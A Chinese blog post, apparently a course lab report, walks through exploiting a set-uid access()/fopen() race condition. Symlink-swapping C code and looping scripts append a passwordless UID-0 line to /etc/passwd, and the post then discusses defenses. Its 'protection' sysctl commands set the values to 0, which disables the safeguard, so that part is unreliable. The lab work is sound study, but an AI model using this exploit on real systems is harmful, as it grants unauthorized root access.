<p>本实验将围绕竞态漏洞的利用和防御展开分析。</p>
<h3 id="2-3-实验过程记录-5"><a href="#2-3-实验过程记录-5" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一-5"><a href="#（1）实验任务一-5" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>我们来看以下程序：</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* vulp.c */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token string">"/tmp/XYZ"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
 
    <span class="token comment">/* get user input */</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%50s"</span><span class="token punctuation">,</span> buffer <span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> W_OK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> 
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No permission \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 这个程序是一个 <code>set-uid</code> 程序（文件属主是 <code>root</code> ），这个程序的功能是将用户的输入，追加到 <code>/tmp/XYZ</code> 这个文件。因为程序是拥有 <code>root</code> 权限，因此在写入操作之前，我们看到程序使用了 <code>access()</code> 函数，用来检查执行程序的用户是否拥有对 <code>/tmp/XYZ</code> 文件的写入权限。</p>
<p>这个过程看起来很完美，用户拥有写入权限时，执行写入操作，用户没有写入权限时不执行操作。然而这个代码的流程却存在竞态条件漏洞。</p>
<p>我们假设这样一种情况，<code>/tmp/XYZ</code> 是个软连接，原本指向 <code>/home/test/race/testfile</code>（文件属主是 <code>test</code> 用户）,然而 <code>access()</code> 函数的执行与 <code>fopen()</code> 函数的执行之间，时间间隔非常长，当 <code>test</code> 用户运行此程序且 <code>access()</code> 函数执行之后，**<code>/tmp/XYZ</code> 软连接文件被 <code>test</code> 用户修改**，指向了 <code>/etc/shadow</code>（属主是 <code>root</code>，其他用户无权限修改）。那么 <code>fopen()</code> 函数的对象，则变成了 <code>/etc/shadow</code>，攻击者可以成功的向 <code>/etc/shadow</code> 文件追加任意内容（程序本身是 <code>setuid</code> 程序，可以修改<code>/etc/shadow</code>）。</p>
<p>这个漏洞从理论上是存在的，然而，我们知道 <strong><code>access()</code> 和 <code>fopen()</code> 之间的时间间隔非常短</strong>，如何成功的利用这个竞态条件漏洞呢？由于我们使用普通用户，无法修改 <code>vulp</code> 程序的代码，所以只能变换思路，<strong>多次执行 <code>vulp</code> 程序，并且反复修改 <code>/tmp/XYZ</code> 文件的软连接指向的文件</strong>。</p>
<h4 id="（2）实验任务二-5"><a href="#（2）实验任务二-5" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>先用下面的命令禁止使用全局可写目录的符号连接：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> sysctl -w kernel.yama.protected_sticky_symlinks<span class="token operator">=</span><span class="token number">0</span>
<span class="token comment"># ubuntu 16.04 命令</span>
<span class="token comment"># sudo sysctl -w fs.protected_symlinks=0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109233245753.png" alt="image-20230109233245753"></p>
<h5 id="1、添加属主为root文件内容"><a href="#1、添加属主为root文件内容" class="headerlink" title="1、添加属主为root文件内容"></a>1、添加属主为root文件内容</h5><p>本实验在蚁景云平台中完成。</p>
<p>观察 <code>/home/test/race</code> 目录中的文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111203658899.png" alt="image-20230111203658899"></p>
<ul>
<li><p><code>rootfile</code> 属主是 <code>root</code>，是我们要修改的目标文件。</p>
</li>
<li><p><code>testfile</code> 属主是 <code>test</code>，用来确保通过 <code>access()</code> 函数的权限检查</p>
</li>
<li><p><code>vulp</code> 是 <code>set-uid</code> 程序属主是 <code>root</code>，是存在竞态条件漏洞的程序</p>
</li>
<li><p><code>contents_to_append</code> 属主是 <code>test</code>，是我们要向 <code>rootfile</code> 追加的内容，可以任意修改</p>
</li>
<li><p><code>check.sh</code> 属主是 <code>test</code>，用来反复执行 <code>vulp</code> 程序并且确保 <code>rootfile</code> 只修改一次。</p>
</li>
</ul>
<p>登录实验机，切换到 <code>test </code>用户：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> - <span class="token builtin class-name">test</span>		<span class="token comment"># 密码为 test123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们查看 <code>rootfile</code>，也即要添加内容的属主为 <code>root</code> 的文件为空：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111204006061.png" alt="image-20230111204006061"></p>
<p>我们添加的内容保存在<code>contents_to_append</code> 中，如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111204110529.png" alt="image-20230111204110529"></p>
<p>在执行vulp程序之前，先运行我们的 <code>attack</code> 程序：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ln -sf /home/test/race/testfile /tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ln -sf /home/test/race/rootfile /tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./attack <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111204307803.png" alt="image-20230111204307803"></p>
<p>我们可以写一个脚本来实现确保写入一次。因为写入一次之后，文件的时间戳会改变，因为我们通过检测rootfile的时间戳来判断是否写入成功。脚本 <code>check.sh</code> 代码如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token assign-left variable">old</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -l /home/test/race/rootfile<span class="token variable">`</span></span>
<span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -l /home/test/race/rootfile<span class="token variable">`</span></span>

<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$old</span>"</span> <span class="token operator">=</span> <span class="token string">"<span class="token variable">$new</span>"</span> <span class="token punctuation">]</span>
<span class="token keyword">do</span>
	./vulp <span class="token operator">&lt;</span> contents_to_append
	<span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -l /home/test/race/rootfile<span class="token variable">`</span></span>
<span class="token keyword">done</span>

<span class="token builtin class-name">echo</span> <span class="token string">"STOP... The root file has been changed"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行该脚本，执行结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111204438214.png" alt="image-20230111204438214"></p>
<p>可以发现，属主为 <code>root</code> 文件 <code>rootfile</code> 的内容被我们添加了。</p>
<h5 id="2、添加新的拥有root权限的用户"><a href="#2、添加新的拥有root权限的用户" class="headerlink" title="2、添加新的拥有root权限的用户"></a>2、添加新的拥有root权限的用户</h5><p>本实验是我附加探索的内容，在虚拟机(<code>Ubuntu 12.04</code>)中完成。</p>
<p>编译 <code>vulp.c</code> 代码，使其为可执行文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -o vulp vulp.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将其设为root set-uid 程序：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> root vulp
<span class="token comment"># 使其变为set-uid程序，这个4表示其他用户执行文件时，具有与所有者相当的权限</span>
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> vulp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>由于后面要用竞态攻击来向系统添加新的拥有 <code>root</code> 权限的用户，这就涉及到到在 <code>/etc/passwd</code> 文件中新增内容，这个部分主要是确定添加的内容。</p>
<p>root用户对应的内容为：第一个字段为用户名，第二个字段为密码的哈希，如为x则表示密码在 <code>/etc/shadow</code> 文件中。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109233830541.png" alt="image-20230109233830541"></p>
<p>各字段及其含义如下表所示：</p>
<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">用户名</td>
<td align="center">用户登录系统时使用的用户名</td>
</tr>
<tr>
<td align="center">密码</td>
<td align="center">密码位</td>
</tr>
<tr>
<td align="center">UID</td>
<td align="center">用户标识号</td>
</tr>
<tr>
<td align="center">GID</td>
<td align="center">缺省组标识号</td>
</tr>
<tr>
<td align="center">注释性描述</td>
<td align="center">例如存放用户全名等信息</td>
</tr>
<tr>
<td align="center">宿主目录</td>
<td align="center">用户登录系统后的缺省目录</td>
</tr>
<tr>
<td align="center">命令解释器</td>
<td align="center">用户使用的Shell，默认为bash</td>
</tr>
</tbody></table>
<p>空密码的哈希值为 <code>U6aMy0wojraho</code>，所以要添加的一行如下，将其保存到 <code>passwd_input</code> 文件中：</p>
<pre class="line-numbers language-none"><code class="language-none">test:U6aMy0wojraho:0:0:test:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同时将这一行添加到 <code>/etc/passwd</code> 文件的最后，尝试用test用户进行登录，可以发现可以无密码登录，且有root权限。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109233530194.png" alt="image-20230109233530194"></p>
<p>将那一行从 <code>/etc/passwd</code> 中删去，后面我们将通过竞态攻击来向&#x2F;etc&#x2F;passwd增添内容。</p>
<p>我们实施竞态攻击来向系统添加新的拥有root权限的用户。</p>
<p>新建一个脚本，不停地运行上面的有漏洞的程序，并每次用 <code>ls -l /etc/passwd</code> 对比初始的来判断文件内容是否发送变化，即攻击是否成功。内容如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash </span>
<span class="token assign-left variable">CHECK_FILE</span><span class="token operator">=</span><span class="token string">"ls -l /etc/passwd"</span> 
<span class="token assign-left variable">old</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span> 
<span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span> 
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$old</span>"</span> <span class="token operator">==</span> <span class="token string">"<span class="token variable">$new</span>"</span> <span class="token punctuation">]</span>
<span class="token keyword">do</span> 
	./vulp <span class="token operator">&lt;</span> passwd_input 
	<span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span>
<span class="token keyword">done</span>
<span class="token builtin class-name">echo</span> <span class="token string">"STOP... The passwd file has been changed"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用来进行攻击的代码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">// 原有链接删除</span>
        <span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 任何人都有写入权限</span>
        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/XYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在窗口1启动攻击进程：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109233551479.png" alt="image-20230109233551479"></p>
<p>在窗口2启动目标进程：</p>
<pre class="line-numbers language-none"><code class="language-none">bash target_process.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>很快，我们可以观察到以下结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109233623306.png" alt="image-20230109233623306"></p>
<p>我们使用 <code>tail -n 5 /etc/passwd</code> 命令查看在 <code>/etc/passwd</code> 中末尾的密码，发现 <code>/etc/passwd</code> 文件已经新增了一行 <code>test</code> 的：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109234008141.png" alt="image-20230109234008141"></p>
<p>我们尝试用 <code>test</code> 账户登录：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109234031084.png" alt="image-20230109234031084"></p>
<p>发现登录后具有 <code>root</code> 权限，可见新增了一个 <code>root</code> 权限的 <code>test</code> 用户，攻击成功。</p>
<h4 id="（3）实验任务三-4"><a href="#（3）实验任务三-4" class="headerlink" title="（3）实验任务三"></a>（3）实验任务三</h4><p><strong>保护机制A：重复检查权限。</strong></p>
<p>想要避免竞态条件的发生并不容易，先检查再访问这个模式在很多程序中都是存在。比起想办法移除漏洞，不如换个思路，我们可以增加更多的竞态条件，这样就能减小攻击者攻击成功的概率了。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> W_OK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> W_OK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">/*嵌套n层*/</span>
        fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No permission \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No permission \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109234336652.png" alt="image-20230109234336652"></p>
<p>可以看到攻击不成功。</p>
<p><strong>保护机制B：最小权限原则</strong></p>
<p>该程序的根本问题就在于它违反了最小权限原则，程序员认识到运行这个程序的用户可能权利过大，所以引入access函数进行限制，但也同时引入了竞态条件的隐患。更好的方法是使用 <code>seteuid</code> 系统调用暂时禁止 <code>root</code> 权限，当需要时再恢复。</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token string">"/tmp/XYZ"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE<span class="token operator">*</span> fp<span class="token punctuation">;</span>
    <span class="token comment">/* get user input */</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%50s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    uid_t euid <span class="token operator">=</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No permission \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">seteuid</span><span class="token punctuation">(</span>euid<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样可以看到攻击不成功。</p>
<p><strong>保护机制C：Ubuntu内置保护方案</strong></p>
<p>下面的命令可以禁止使用全局可写目录的符号连接：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ubuntu 12.04 命令</span>
<span class="token function">sudo</span> sysctl -w kernel.yama.protected_sticky_symlinks<span class="token operator">=</span><span class="token number">0</span>
<span class="token comment"># ubuntu 16.04 命令</span>
<span class="token function">sudo</span> sysctl -w fs.protected_symlinks<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-4-实验结果分析-5"><a href="#2-4-实验结果分析-5" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>在本实验中，我们构造了具有竞态条件漏洞的程序，并模拟攻击者对具有竞态条件漏洞的程序构造相应漏洞利用代码进行提权，包括添加属主为root文件内容、添加新的拥有root权限的用户等。可以看到，在本案例中，产生此漏洞的根本原因是程序员未遵循最小权限原则，导致运行该程序的用户可能权利过大。我们在编写代码的过程中必须充分考虑其中的安全问题。</p>
<h2 id="第三章-结论与心得-5"><a href="#第三章-结论与心得-5" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>竞态条件漏洞是一类比较常见的漏洞，攻击者利用程序中存在的此类漏洞，实现在用户态下对 <code>root</code> 文件的内容进行追加的操作。此外，我还利用了这个原理，在试验机中实现在 <code>/etc/passwd</code> 文件中新增内容，从而添加新的拥有 <code>root</code> 权限的用户。为了避免此类漏洞，我们在实际编写代码中要树立相关安全意识，并对操作系统的补丁及时更新，从而有效防范此类漏洞的发生。</p>

                                    
                            </div>
                            <hr />

                            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">ShiQuLiZhi</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.qqzzss.top/2023/01/05/security/xin-xi-an-quan-shi-yan-ke-cheng-er-shi-yan-ji-lu/">https://www.qqzzss.top/2023/01/05/security/xin-xi-an-quan-shi-yan-ke-cheng-er-shi-yan-ji-lu/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">ShiQuLiZhi</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



                                <div class="tag_share" style="display: block;">
                                    <div class="post-meta__tag-list" style="display: inline-block;">
                                        
                                            <div class="article-tag">
                                                
                                                    <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                                                        <span class="chip bg-color">
                                                            信息安全
                                                        </span>
                                                    </a>
                                                    
                                                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                                        <span class="chip bg-color">
                                                            网络安全
                                                        </span>
                                                    </a>
                                                    
                                                    <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">
                                                        <span class="chip bg-color">
                                                            软件安全
                                                        </span>
                                                    </a>
                                                    
                                            </div>
                                            
                                    </div>
                                    <div class="post_share"
                                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                                    </div>
                                </div>
                                
                        </div>
    </div>

    

                

                            

                                        

                                                    
                                                        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table,
    th,
    td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table,
    th,
    td {
        border: 0;
    }

    table tr:nth-child(2n),
    thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
